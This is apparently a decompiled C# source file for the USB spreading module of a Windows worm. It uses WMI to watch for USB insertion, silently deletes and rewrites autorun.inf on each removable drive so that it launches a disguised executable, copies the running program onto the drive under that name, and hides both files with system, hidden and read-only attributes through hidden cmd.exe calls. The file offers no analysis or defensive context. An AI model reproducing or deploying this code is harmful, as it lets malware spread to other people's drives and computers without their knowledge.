using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Threading;

namespace _2012;

internal class x0_usb
{
	private static ManagementEventWatcher w;

	public static void Listen()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		ManagementScope val = new ManagementScope("root\\cimv2");
		val.get_Options().set_EnablePrivileges(true);
		try
		{
			WqlEventQuery val2 = new WqlEventQuery();
			val2.set_EventClassName("__InstanceCreationEvent");
			val2.set_WithinInterval(new TimeSpan(0, 0, 3));
			val2.set_Condition("TargetInstance ISA 'Win32_USBControllerdevice'");
			w = new ManagementEventWatcher(val, (EventQuery)(object)val2);
			w.add_EventArrived(new EventArrivedEventHandler(usb_add));
			w.Start();
		}
		catch
		{
			if (w != null)
			{
				w.Stop();
			}
		}
	}

	public static void usb_add(object sender, EventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			if (driveInfo.DriveType != DriveType.Removable)
			{
				continue;
			}
			try
			{
				if (File.Exists(driveInfo.Name + "autorun.inf"))
				{
					try
					{
						File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Normal);
						ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c attrib -a -s -r -h " + driveInfo.Name + "autorun.inf");
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo);
						File.SetAttributes(driveInfo.Name + "autorun.inf", FileAttributes.Normal);
						ProcessStartInfo processStartInfo2 = new ProcessStartInfo("cmd.exe", "/c del " + driveInfo.Name + "autorun.inf");
						processStartInfo2.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo2);
					}
					catch (Exception)
					{
					}
				}
				if (File.Exists(driveInfo.Name + "x625df45h426aSS.exe"))
				{
					try
					{
						File.SetAttributes(driveInfo.Name + "x625df45h426aSS.exe", File.GetAttributes(driveInfo.Name + "x625df45h426aSS.exe") | FileAttributes.Normal);
						ProcessStartInfo processStartInfo3 = new ProcessStartInfo("cmd.exe", "/c attrib -a -s -r -h " + driveInfo.Name + "x625df45h426aSS.exe");
						processStartInfo3.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo3);
						File.SetAttributes(driveInfo.Name + "x625df45h426aSS.exe", FileAttributes.Normal);
						ProcessStartInfo processStartInfo4 = new ProcessStartInfo("cmd.exe", "/c del " + driveInfo.Name + "x625df45h426aSS.exe");
						processStartInfo4.WindowStyle = ProcessWindowStyle.Hidden;
						Process.Start(processStartInfo4);
					}
					catch (Exception)
					{
					}
				}
			}
			catch
			{
			}
			try
			{
				StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
				streamWriter.WriteLine("[autorun]");
				streamWriter.WriteLine("label=USB");
				streamWriter.WriteLine("icon=%SystemRoot%\\system32\\SHELL32.dll,4");
				streamWriter.WriteLine("open=x625df45h426aSS.exe");
				streamWriter.WriteLine("shellexecute=x625df45h426aSS.exe");
				streamWriter.WriteLine("action=Abrir USB");
				streamWriter.Close();
				File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
			}
			catch (Exception)
			{
			}
			try
			{
				File.Copy(Process.GetCurrentProcess().MainModule!.FileName, driveInfo.Name + "x625df45h426aSS.exe");
				File.SetAttributes(driveInfo.Name + "x625df45h426aSS.exe", File.GetAttributes(driveInfo.Name + "x625df45h426aSS.exe") | FileAttributes.System | FileAttributes.Hidden | FileAttributes.NotContentIndexed | FileAttributes.ReadOnly);
			}
			catch (Exception)
			{
			}
			finally
			{
				Thread.Sleep(3500);
			}
		}
	}
}
